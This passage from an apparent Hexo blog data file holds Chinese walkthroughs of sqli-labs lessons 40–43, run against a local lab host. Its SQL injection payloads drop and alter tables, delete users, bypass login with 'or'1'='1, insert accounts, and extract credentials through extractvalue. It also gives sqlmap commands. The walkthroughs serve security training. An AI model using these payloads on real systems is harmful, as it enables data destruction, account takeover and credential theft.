src=\"/img/sql/Lesson-40/006.png\" alt=\"006\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-40-GET盲注-堆叠注入-字符型\"><a href=\"#sqli-labs-lession-40-GET盲注-堆叠注入-字符型\" class=\"headerlink\" title=\"sqli-labs lession-40 GET盲注-堆叠注入-字符型\"></a>sqli-labs lession-40 GET盲注-堆叠注入-字符型</h1><hr>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>这一课只是是盲注的堆叠注入，并且闭合方式为<code>&#39;)</code>。</p>\n<p><code>http://192.168.75.132/sql/Less-40/?id=1&#39;) and if(1,sleep(10),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-40/001.png\" alt=\"001\"></p>\n<h2 id=\"增\"><a href=\"#增\" class=\"headerlink\" title=\"增\"></a>增</h2><p>在password字段后添加status字段</p>\n<p><code>http://192.168.75.132/sql/Less-40/?id=1&#39;);ALTER TABLE `security`.`users` \nADD COLUMN `status` tinyint(1) NOT NULL AFTER `password`;%23</code></p>\n<p><img src=\"/img/sql/Lesson-40/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-40/003.png\" alt=\"003\"></p>\n<h2 id=\"删\"><a href=\"#删\" class=\"headerlink\" title=\"删\"></a>删</h2><p>删除以admin开头的用户。</p>\n<p><code>http://192.168.75.132/sql/Less-40/?id=1&#39;);DELETE from users  where username like &#39;admin%&#39;;%23</code></p>\n<p><img src=\"/img/sql/Lesson-40/004.png\" alt=\"004\"></p>\n<h2 id=\"改\"><a href=\"#改\" class=\"headerlink\" title=\"改\"></a>改</h2><p><code>http://192.168.75.132/sql/Less-40/?id=1&#39;);alter TABLE users rename to newusrs;%23</code></p>\n<p><img src=\"/img/sql/Lesson-40/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-40/006.png\" alt=\"006\"></p>\n"},{"title":"sqli-labs lession-41 GET盲注-整型-堆叠注入","date":"2018-10-21T06:36:09.000Z","_content":"\n# sqli-labs lession-41 GET盲注-整型-堆叠注入\n\n---\n\n## 分析\n\n与Lesson-40只是闭合不同\n\n`http://192.168.75.132/sql/Less-41/?id=-1 union select 1,2,3%23`\n\n![001](/img/sql/Lesson-41/001.png)\n\n## 增\n\n添加索引\n\n`http://192.168.75.132/sql/Less-41/?id=1;CREATE UNIQUE INDEX name ON users(username);%23`\n\n![002](/img/sql/Lesson-41/002.png)\n\n![003](/img/sql/Lesson-41/003.png)\n\n## 删\n\n删除索引。\n\n`http://192.168.75.132/sql/Less-41/?id=1;ALTER TABLE security.users DROP INDEX name;%23`\n\n![004](/img/sql/Lesson-41/004.png)\n\n## 改\n\n将索引修改\n\n``http://192.168.75.132/sql/Less-41/?id=1;ALTER TABLE `security`.`users` DROP INDEX `name`,ADD UNIQUE INDEX `newname`(`id`) USING BTREE;%23``\n\n![005](/img/sql/Lesson-41/005.png)\n\n![006](/img/sql/Lesson-41/006.png)","source":"_posts/sqli-labs-lession-41-GET盲注-整型-堆叠注入.md","raw":"---\ntitle: sqli-labs lession-41 GET盲注-整型-堆叠注入\ndate: 2018-10-21 14:36:09\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-41 GET盲注-整型-堆叠注入\n\n---\n\n## 分析\n\n与Lesson-40只是闭合不同\n\n`http://192.168.75.132/sql/Less-41/?id=-1 union select 1,2,3%23`\n\n![001](/img/sql/Lesson-41/001.png)\n\n## 增\n\n添加索引\n\n`http://192.168.75.132/sql/Less-41/?id=1;CREATE UNIQUE INDEX name ON users(username);%23`\n\n![002](/img/sql/Lesson-41/002.png)\n\n![003](/img/sql/Lesson-41/003.png)\n\n## 删\n\n删除索引。\n\n`http://192.168.75.132/sql/Less-41/?id=1;ALTER TABLE security.users DROP INDEX name;%23`\n\n![004](/img/sql/Lesson-41/004.png)\n\n## 改\n\n将索引修改\n\n``http://192.168.75.132/sql/Less-41/?id=1;ALTER TABLE `security`.`users` DROP INDEX `name`,ADD UNIQUE INDEX `newname`(`id`) USING BTREE;%23``\n\n![005](/img/sql/Lesson-41/005.png)\n\n![006](/img/sql/Lesson-41/006.png)","slug":"sqli-labs-lession-41-GET盲注-整型-堆叠注入","published":1,"updated":"2019-06-19T17:23:13.393Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istes00594dsb9y5bart2","content":"<h1 id=\"sqli-labs-lession-41-GET盲注-整型-堆叠注入\"><a href=\"#sqli-labs-lession-41-GET盲注-整型-堆叠注入\" class=\"headerlink\" title=\"sqli-labs lession-41 GET盲注-整型-堆叠注入\"></a>sqli-labs lession-41 GET盲注-整型-堆叠注入</h1><hr>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>与Lesson-40只是闭合不同</p>\n<p><code>http://192.168.75.132/sql/Less-41/?id=-1 union select 1,2,3%23</code></p>\n<p><img src=\"/img/sql/Lesson-41/001.png\" alt=\"001\"></p>\n<h2 id=\"增\"><a href=\"#增\" class=\"headerlink\" title=\"增\"></a>增</h2><p>添加索引</p>\n<p><code>http://192.168.75.132/sql/Less-41/?id=1;CREATE UNIQUE INDEX name ON users(username);%23</code></p>\n<p><img src=\"/img/sql/Lesson-41/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-41/003.png\" alt=\"003\"></p>\n<h2 id=\"删\"><a href=\"#删\" class=\"headerlink\" title=\"删\"></a>删</h2><p>删除索引。</p>\n<p><code>http://192.168.75.132/sql/Less-41/?id=1;ALTER TABLE security.users DROP INDEX name;%23</code></p>\n<p><img src=\"/img/sql/Lesson-41/004.png\" alt=\"004\"></p>\n<h2 id=\"改\"><a href=\"#改\" class=\"headerlink\" title=\"改\"></a>改</h2><p>将索引修改</p>\n<p><code>http://192.168.75.132/sql/Less-41/?id=1;ALTER TABLE `security`.`users` DROP INDEX `name`,ADD UNIQUE INDEX `newname`(`id`) USING BTREE;%23</code></p>\n<p><img src=\"/img/sql/Lesson-41/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-41/006.png\" alt=\"006\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-41-GET盲注-整型-堆叠注入\"><a href=\"#sqli-labs-lession-41-GET盲注-整型-堆叠注入\" class=\"headerlink\" title=\"sqli-labs lession-41 GET盲注-整型-堆叠注入\"></a>sqli-labs lession-41 GET盲注-整型-堆叠注入</h1><hr>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>与Lesson-40只是闭合不同</p>\n<p><code>http://192.168.75.132/sql/Less-41/?id=-1 union select 1,2,3%23</code></p>\n<p><img src=\"/img/sql/Lesson-41/001.png\" alt=\"001\"></p>\n<h2 id=\"增\"><a href=\"#增\" class=\"headerlink\" title=\"增\"></a>增</h2><p>添加索引</p>\n<p><code>http://192.168.75.132/sql/Less-41/?id=1;CREATE UNIQUE INDEX name ON users(username);%23</code></p>\n<p><img src=\"/img/sql/Lesson-41/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-41/003.png\" alt=\"003\"></p>\n<h2 id=\"删\"><a href=\"#删\" class=\"headerlink\" title=\"删\"></a>删</h2><p>删除索引。</p>\n<p><code>http://192.168.75.132/sql/Less-41/?id=1;ALTER TABLE security.users DROP INDEX name;%23</code></p>\n<p><img src=\"/img/sql/Lesson-41/004.png\" alt=\"004\"></p>\n<h2 id=\"改\"><a href=\"#改\" class=\"headerlink\" title=\"改\"></a>改</h2><p>将索引修改</p>\n<p><code>http://192.168.75.132/sql/Less-41/?id=1;ALTER TABLE `security`.`users` DROP INDEX `name`,ADD UNIQUE INDEX `newname`(`id`) USING BTREE;%23</code></p>\n<p><img src=\"/img/sql/Lesson-41/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-41/006.png\" alt=\"006\"></p>\n"},{"title":"sqli-labs lession-42 POST报错注入-字符型-堆叠注入","date":"2018-10-21T08:44:55.000Z","_content":"\n# sqli-labs lession-42 POST报错注入-字符型-堆叠注入\n\n---\n\n## 分析\n\nlogin.php:\n\n![001](/img/sql/Lesson-42/001.png)\n\n只对username进行了转义，而password没有处理,导致存在万能密码`'or'1'='1`\n\n![002](/img/sql/Lesson-42/002.png)\n\n通过密码填写`' or '1'='1' and id='2` ,还能登入id=2的用户。\n\n![002_1](/img/sql/Lesson-42/002_1.png)\n\n![002_2](/img/sql/Lesson-42/002_2.png)\n\n同时还可发现底下的sql函数是可以执行多个sql语句的，可以利用password来堆叠注入。\n\n![003](/img/sql/Lesson-42/003.png)\n\nlogged-in.php：\n\n利用万能密码进入后是一个修改密码的界面。\n\n![004](/img/sql/Lesson-42/004.png)\n\n![005](/img/sql/Lesson-42/005.png)\n\n蓝线的是进行了转义,红线是有可能注入的地方。\n\n## 注入\n\n利用报错注入获取信息(这是基本功,不写过程了)。\n\n利用堆叠注入插入用户。\n\n账号不填，密码填写如下。\n\n`';INSERT INTO users(username, password) VALUES (\"secure'#\", \"123456\");`\n\n登录返回如下界面\n\n![006](/img/sql/Lesson-42/006.png)\n\n但是数据库中插入数据成功。\n\n![007](/img/sql/Lesson-42/007.png)\n\n同样还可以进行其他增删改操作。\n\n## 二次注入\n\n因为logged-in.php页面直接拿session中的username来用了,没有进行检查,可以添加一个（用户‘#）来截断SQL语句。\n\n例如用`secure'#`达到修改secure用户密码的目的。\n\n原来数据库。\n\n![008](/img/sql/Lesson-42/008.png)\n\n利用前面的方式添加`secure'#`。正常登录改密界面。\n\n修改密码为233。\n\n![009](/img/sql/Lesson-42/009.png)\n\n![010](/img/sql/Lesson-42/010.png)\n\n返回修改成功页面。\n\n![011](/img/sql/Lesson-42/011.png)\n\n这里的username最大只有20个字符,其他的sql语句不好利用了。\n\n这里只是提供了一种思路,就这一课目的而言有了堆叠注入完全用不到二次注入了。\n\n\n\n\n\n","source":"_posts/sqli-labs-lession-42-POST报错注入-字符型-堆叠注入.md","raw":"---\ntitle: sqli-labs lession-42 POST报错注入-字符型-堆叠注入\ndate: 2018-10-21 16:44:55\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-42 POST报错注入-字符型-堆叠注入\n\n---\n\n## 分析\n\nlogin.php:\n\n![001](/img/sql/Lesson-42/001.png)\n\n只对username进行了转义，而password没有处理,导致存在万能密码`'or'1'='1`\n\n![002](/img/sql/Lesson-42/002.png)\n\n通过密码填写`' or '1'='1' and id='2` ,还能登入id=2的用户。\n\n![002_1](/img/sql/Lesson-42/002_1.png)\n\n![002_2](/img/sql/Lesson-42/002_2.png)\n\n同时还可发现底下的sql函数是可以执行多个sql语句的，可以利用password来堆叠注入。\n\n![003](/img/sql/Lesson-42/003.png)\n\nlogged-in.php：\n\n利用万能密码进入后是一个修改密码的界面。\n\n![004](/img/sql/Lesson-42/004.png)\n\n![005](/img/sql/Lesson-42/005.png)\n\n蓝线的是进行了转义,红线是有可能注入的地方。\n\n## 注入\n\n利用报错注入获取信息(这是基本功,不写过程了)。\n\n利用堆叠注入插入用户。\n\n账号不填，密码填写如下。\n\n`';INSERT INTO users(username, password) VALUES (\"secure'#\", \"123456\");`\n\n登录返回如下界面\n\n![006](/img/sql/Lesson-42/006.png)\n\n但是数据库中插入数据成功。\n\n![007](/img/sql/Lesson-42/007.png)\n\n同样还可以进行其他增删改操作。\n\n## 二次注入\n\n因为logged-in.php页面直接拿session中的username来用了,没有进行检查,可以添加一个（用户‘#）来截断SQL语句。\n\n例如用`secure'#`达到修改secure用户密码的目的。\n\n原来数据库。\n\n![008](/img/sql/Lesson-42/008.png)\n\n利用前面的方式添加`secure'#`。正常登录改密界面。\n\n修改密码为233。\n\n![009](/img/sql/Lesson-42/009.png)\n\n![010](/img/sql/Lesson-42/010.png)\n\n返回修改成功页面。\n\n![011](/img/sql/Lesson-42/011.png)\n\n这里的username最大只有20个字符,其他的sql语句不好利用了。\n\n这里只是提供了一种思路,就这一课目的而言有了堆叠注入完全用不到二次注入了。\n\n\n\n\n\n","slug":"sqli-labs-lession-42-POST报错注入-字符型-堆叠注入","published":1,"updated":"2019-06-19T17:23:13.393Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istew005e4dsbhdr222y4","content":"<h1 id=\"sqli-labs-lession-42-POST报错注入-字符型-堆叠注入\"><a href=\"#sqli-labs-lession-42-POST报错注入-字符型-堆叠注入\" class=\"headerlink\" title=\"sqli-labs lession-42 POST报错注入-字符型-堆叠注入\"></a>sqli-labs lession-42 POST报错注入-字符型-堆叠注入</h1><hr>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>login.php:</p>\n<p><img src=\"/img/sql/Lesson-42/001.png\" alt=\"001\"></p>\n<p>只对username进行了转义，而password没有处理,导致存在万能密码<code>&#39;or&#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-42/002.png\" alt=\"002\"></p>\n<p>通过密码填写<code>&#39; or &#39;1&#39;=&#39;1&#39; and id=&#39;2</code> ,还能登入id=2的用户。</p>\n<p><img src=\"/img/sql/Lesson-42/002_1.png\" alt=\"002_1\"></p>\n<p><img src=\"/img/sql/Lesson-42/002_2.png\" alt=\"002_2\"></p>\n<p>同时还可发现底下的sql函数是可以执行多个sql语句的，可以利用password来堆叠注入。</p>\n<p><img src=\"/img/sql/Lesson-42/003.png\" alt=\"003\"></p>\n<p>logged-in.php：</p>\n<p>利用万能密码进入后是一个修改密码的界面。</p>\n<p><img src=\"/img/sql/Lesson-42/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/sql/Lesson-42/005.png\" alt=\"005\"></p>\n<p>蓝线的是进行了转义,红线是有可能注入的地方。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>利用报错注入获取信息(这是基本功,不写过程了)。</p>\n<p>利用堆叠注入插入用户。</p>\n<p>账号不填，密码填写如下。</p>\n<p><code>&#39;;INSERT INTO users(username, password) VALUES (&quot;secure&#39;#&quot;, &quot;123456&quot;);</code></p>\n<p>登录返回如下界面</p>\n<p><img src=\"/img/sql/Lesson-42/006.png\" alt=\"006\"></p>\n<p>但是数据库中插入数据成功。</p>\n<p><img src=\"/img/sql/Lesson-42/007.png\" alt=\"007\"></p>\n<p>同样还可以进行其他增删改操作。</p>\n<h2 id=\"二次注入\"><a href=\"#二次注入\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h2><p>因为logged-in.php页面直接拿session中的username来用了,没有进行检查,可以添加一个（用户‘#）来截断SQL语句。</p>\n<p>例如用<code>secure&#39;#</code>达到修改secure用户密码的目的。</p>\n<p>原来数据库。</p>\n<p><img src=\"/img/sql/Lesson-42/008.png\" alt=\"008\"></p>\n<p>利用前面的方式添加<code>secure&#39;#</code>。正常登录改密界面。</p>\n<p>修改密码为233。</p>\n<p><img src=\"/img/sql/Lesson-42/009.png\" alt=\"009\"></p>\n<p><img src=\"/img/sql/Lesson-42/010.png\" alt=\"010\"></p>\n<p>返回修改成功页面。</p>\n<p><img src=\"/img/sql/Lesson-42/011.png\" alt=\"011\"></p>\n<p>这里的username最大只有20个字符,其他的sql语句不好利用了。</p>\n<p>这里只是提供了一种思路,就这一课目的而言有了堆叠注入完全用不到二次注入了。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-42-POST报错注入-字符型-堆叠注入\"><a href=\"#sqli-labs-lession-42-POST报错注入-字符型-堆叠注入\" class=\"headerlink\" title=\"sqli-labs lession-42 POST报错注入-字符型-堆叠注入\"></a>sqli-labs lession-42 POST报错注入-字符型-堆叠注入</h1><hr>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>login.php:</p>\n<p><img src=\"/img/sql/Lesson-42/001.png\" alt=\"001\"></p>\n<p>只对username进行了转义，而password没有处理,导致存在万能密码<code>&#39;or&#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-42/002.png\" alt=\"002\"></p>\n<p>通过密码填写<code>&#39; or &#39;1&#39;=&#39;1&#39; and id=&#39;2</code> ,还能登入id=2的用户。</p>\n<p><img src=\"/img/sql/Lesson-42/002_1.png\" alt=\"002_1\"></p>\n<p><img src=\"/img/sql/Lesson-42/002_2.png\" alt=\"002_2\"></p>\n<p>同时还可发现底下的sql函数是可以执行多个sql语句的，可以利用password来堆叠注入。</p>\n<p><img src=\"/img/sql/Lesson-42/003.png\" alt=\"003\"></p>\n<p>logged-in.php：</p>\n<p>利用万能密码进入后是一个修改密码的界面。</p>\n<p><img src=\"/img/sql/Lesson-42/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/sql/Lesson-42/005.png\" alt=\"005\"></p>\n<p>蓝线的是进行了转义,红线是有可能注入的地方。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>利用报错注入获取信息(这是基本功,不写过程了)。</p>\n<p>利用堆叠注入插入用户。</p>\n<p>账号不填，密码填写如下。</p>\n<p><code>&#39;;INSERT INTO users(username, password) VALUES (&quot;secure&#39;#&quot;, &quot;123456&quot;);</code></p>\n<p>登录返回如下界面</p>\n<p><img src=\"/img/sql/Lesson-42/006.png\" alt=\"006\"></p>\n<p>但是数据库中插入数据成功。</p>\n<p><img src=\"/img/sql/Lesson-42/007.png\" alt=\"007\"></p>\n<p>同样还可以进行其他增删改操作。</p>\n<h2 id=\"二次注入\"><a href=\"#二次注入\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h2><p>因为logged-in.php页面直接拿session中的username来用了,没有进行检查,可以添加一个（用户‘#）来截断SQL语句。</p>\n<p>例如用<code>secure&#39;#</code>达到修改secure用户密码的目的。</p>\n<p>原来数据库。</p>\n<p><img src=\"/img/sql/Lesson-42/008.png\" alt=\"008\"></p>\n<p>利用前面的方式添加<code>secure&#39;#</code>。正常登录改密界面。</p>\n<p>修改密码为233。</p>\n<p><img src=\"/img/sql/Lesson-42/009.png\" alt=\"009\"></p>\n<p><img src=\"/img/sql/Lesson-42/010.png\" alt=\"010\"></p>\n<p>返回修改成功页面。</p>\n<p><img src=\"/img/sql/Lesson-42/011.png\" alt=\"011\"></p>\n<p>这里的username最大只有20个字符,其他的sql语句不好利用了。</p>\n<p>这里只是提供了一种思路,就这一课目的而言有了堆叠注入完全用不到二次注入了。</p>\n"},{"title":"sqli-labs lession-43 POST基于错误-字符型-堆叠注入变形","date":"2018-10-21T11:30:32.000Z","_content":"\n# sqli-labs lession-43 POST基于错误-字符型-堆叠注入变形\n\n---\n\n## 分析\n\n这一课Lesson-42只是闭合不同。详细分析看上一课。\n\n{% post_link sqli-labs-lession-42-POST报错注入-字符型-堆叠注入 点击查看Lesson-42%}\n\n## 注入\n\n利用password报错注入。单引号会报错。\n\n![001](/img/sql/Lesson-43/001.png)\n\n根据报错信息获取数据。这里hackbar没有效果,手动测试。\n\n### 获取数据库名\n\n`')and extractvalue(null,concat(0x7e,database(),0x7e))#`\n\n![002](/img/sql/Lesson-43/002.png)\n\n![003](/img/sql/Lesson-43/003.png)\n\n### 获取表名\n\n`select group_concat(table_name) from information_schema.tables where table_schema='security'`\n\n![0044](/img/sql/Lesson-43/004.png)\n\n![005](/img/sql/Lesson-43/005.png)\n\n### 获取列名\n\n`')and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'),0x7e))#`\n\n![006](/img/sql/Lesson-43/006.png)\n\n![007](/img/sql/Lesson-43/007.png)\n\n### 获取字段\n\n`')and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 3,1),0x7e))#`\n\n![008](/img/sql/Lesson-43/008.png)\n\n![009](/img/sql/Lesson-43/009.png)\n\n## 堆叠注入\n\n{% post_link sqli-labs-lession-42-POST报错注入-字符型-堆叠注入 点击查看Lesson-42%}\n\n## SQLMAP\n\n用burpsuite抓包\n\n```\nPOST /sql/Less-43/login.php HTTP/1.1\nHost: 192.168.75.132\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.75.132/sql/Less-43/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 48\nCookie: PHPSESSID=ajc8kb6jotq4mv1n736ni1t624\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nlogin_user=123&login_password=123&mysubmit=Login\n```\n\n`sqlmap -r post/post_43.txt -p \"login_password\" --method=POST --dbms mysql --technique E -v 3 --level 2 --flush-session --fresh-queries`\n\n![010](/img/sql/Lesson-43/010.png)\n\n`sqlmap -r post/post_43.txt -p \"login_password\" --method=POST --dbms mysql --technique E -v 3 --level 2 --dbs --threads 20`\n\n![011](/img/sql/Lesson-43/011.png)\n\n`sqlmap -r post/post_43.txt -p \"login_password\" --method=POST --dbms mysql --technique E -v 3 --level 2 -D security --tables --threads 20`\n\n![012](/img/sql/Lesson-43/012.png)\n\n![013](/img/sql/Lesson-43/013.png)\n\n![014](/img/sql/Lesson-43/014.png)\n\n\n\n","source":"_posts/sqli-labs-lession-43-POST基于错误-字符型-堆叠注入变形.md","raw":"---\ntitle: sqli-labs lession-43 POST基于错误-字符型-堆叠注入变形\ndate: 2018-10-21 19:30:32\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-43 POST基于错误-字符型-堆叠注入变形\n\n---\n\n## 分析\n\n这一课Lesson-42只是闭合不同。详细分析看上一课。\n\n{% post_link sqli-labs-lession-42-POST报错注入-字符型-堆叠注入 点击查看Lesson-42%}\n\n## 注入\n\n利用password报错注入。单引号会报错。\n\n![001](/img/sql/Lesson-43/001.png)\n\n根据报错信息获取数据。这里hackbar没有效果,手动测试。\n\n### 获取数据库名\n\n`')and extractvalue(null,concat(0x7e,database(),0x7e))#`\n\n![002](/img/sql/Lesson-43/002.png)\n\n![003](/img/sql/Lesson-43/003.png)\n\n### 获取表名\n\n`select group_concat(table_name) from information_schema.tables where table_schema='security'`\n\n![0044](/img/sql/Lesson-43/004.png)\n\n![005](/img/sql/Lesson-43/005.png)\n\n### 获取列名\n\n`')and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'),0x7e))#`\n\n![006](/img/sql/Lesson-43/006.png)\n\n![007](/img/sql/Lesson-43/007.png)\n\n### 获取字段\n\n`')and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 3,1),0x7e))#`\n\n![008](/img/sql/Lesson-43/008.png)\n\n![009](/img/sql/Lesson-43/009.png)\n\n## 堆叠注入\n\n{% post_link sqli-labs-lession-42-POST报错注入-字符型-堆叠注入 点击查看Lesson-42%}\n\n## SQLMAP\n\n用burpsuite抓包\n\n```\nPOST /sql/Less-43/login.php HTTP/1.1\nHost: 192.168.75.132\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.75.132/sql/Less-43/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 48\nCookie: PHPSESSID=ajc8kb6jotq4mv1n736ni1t624\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nlogin_user=123&login_password=123&mysubmit=Login\n```\n\n`sqlmap -r post/post_43.txt -p \"login_password\" --method=POST --dbms mysql --technique E -v 3 --level 2 --flush-session --fresh-queries`\n\n![010](/img/sql/Lesson-43/010.png)\n\n`sqlmap -r post/post_43.txt -p \"login_password\" --method=POST --dbms mysql --technique E -v 3 --level 2 --dbs --threads 20`\n\n![011](/img/sql/Lesson-43/011.png)\n\n`sqlmap -r post/post_43.txt -p \"login_password\" --method=POST --dbms mysql --technique E -v 3 --level 2 -D security --tables --threads 20`\n\n![012](/img/sql/Lesson-43/012.png)\n\n![013](/img/sql/Lesson-43/013.png)\n\n![014](/img/sql/Lesson-43/014.png)\n\n\n\n","slug":"sqli-labs-lession-43-POST基于错误-字符型-堆叠注入变形","published":1,"updated":"2019-06-19T17:23:13.393Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istey005h4dsbht01bwfp","content":"<h1 id=\"sqli-labs-lession-43-POST基于错误-字符型-堆叠注入变形\"><a href=\"#sqli-labs-lession-43-POST基于错误-字符型-堆叠注入变形\" class=\"headerlink\" title=\"sqli-labs lession-43 POST基于错误-字符型-堆叠注入变形\"></a>sqli-labs lession-43 POST基于错误-字符型-堆叠注入变形</h1><hr>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>这一课Lesson-42只是闭合不同。详细分析看上一课。</p>\n<a href=\"/2018/10/21/sqli-labs-lession-42-POST报错注入-字符型-堆叠注入/\" title=\"点击查看Lesson-42\">点击查看Lesson-42</a>\n\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>利用password报错注入。单引号会报错。</p>\n<p><img src=\"/img/sql/Lesson-43/001.png\" alt=\"001\"></p>\n<p>根据报错信息获取数据。这里hackbar没有效果,手动测试。</p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>&#39;)and extractvalue(null,concat(0x7e,database(),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-43/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-43/003.png\" alt=\"003\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;</code></p>\n<p><img src=\"/img/sql/Lesson-43/004.png\" alt=\"0044\"></p>\n<p><img src=\"/img/sql/Lesson-43/005.png\" alt=\"005\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>&#39;)and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-43/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-43/007.png\" alt=\"007\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>&#39;)and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 3,1),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-43/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-43/009.png\" alt=\"009\"></p>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><a href=\"/2018/10/21/sqli-labs-lession-42-POST报错注入-字符型-堆叠注入/\" title=\"点击查看Lesson-42\">点击查看Lesson-42</a>\n\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>用burpsuite抓包</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST <span class=\"regexp\">/sql/</span>Less<span class=\"number\">-43</span><span class=\"regexp\">/login.php HTTP/</span><span class=\"number\">1.1</span></span><br><span class=\"line\"><span class=\"string\">Host:</span> <span class=\"number\">192.168</span><span class=\"number\">.75</span><span class=\"number\">.132</span></span><br><span class=\"line\">User-<span class=\"string\">Agent:</span> Mozilla<span class=\"regexp\">/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/</span><span class=\"number\">20100101</span> Firefox/<span class=\"number\">62.0</span></span><br><span class=\"line\"><span class=\"string\">Accept:</span> text<span class=\"regexp\">/html,application/</span>xhtml+xml,application<span class=\"regexp\">/xml;q=0.9,*/</span>*;q=<span class=\"number\">0.8</span></span><br><span class=\"line\">Accept-<span class=\"string\">Language:</span> en-US,en;q=<span class=\"number\">0.5</span></span><br><span class=\"line\">Accept-<span class=\"string\">Encoding:</span> gzip, deflate</span><br><span class=\"line\"><span class=\"string\">Referer:</span> <span class=\"string\">http:</span><span class=\"comment\">//192.168.75.132/sql/Less-43/</span></span><br><span class=\"line\">Content-<span class=\"string\">Type:</span> application/x-www-form-urlencoded</span><br><span class=\"line\">Content-<span class=\"string\">Length:</span> <span class=\"number\">48</span></span><br><span class=\"line\"><span class=\"string\">Cookie:</span> PHPSESSID=ajc8kb6jotq4mv1n736ni1t624</span><br><span class=\"line\"><span class=\"string\">Connection:</span> close</span><br><span class=\"line\">Upgrade-Insecure-<span class=\"string\">Requests:</span> <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">login_user=<span class=\"number\">123</span>&amp;login_password=<span class=\"number\">123</span>&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -r post/post_43.txt -p &quot;login_password&quot; --method=POST --dbms mysql --technique E -v 3 